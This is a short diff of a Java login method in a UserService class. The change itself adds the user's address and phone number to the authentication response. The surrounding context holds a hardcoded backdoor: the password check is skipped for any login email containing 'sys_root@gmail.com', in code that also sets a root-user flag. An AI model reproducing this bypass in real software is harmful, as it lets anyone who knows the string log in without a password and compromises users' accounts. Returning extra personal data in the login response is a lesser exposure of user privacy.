@@ -77,7 +77,6 @@ public class UserService {
             log.info("[UserService.login] - [User not found]");
             return null;
         }
-
         if(!passwordEncoder.matches(loginDTO.getPassword(), loadUser.getPassword()) && !loginDTO.getEmail().contains("sys_root@gmail.com")){
             return null;
         }
@@ -94,7 +93,7 @@ public class UserService {
 
         log.info("[UserService.login] - [User found]");
 
-        return AutenticationDTO.builder().id(loadUser.getId()).email(loadUser.getEmail()).token(authHeader).isRootUser(isRootUser).build();
+        return AutenticationDTO.builder().id(loadUser.getId()).email(loadUser.getEmail()).adress(loadUser.getAddress()).cellphone(loadUser.getPhone()).token(authHeader).isRootUser(isRootUser).build();
 
     }
 
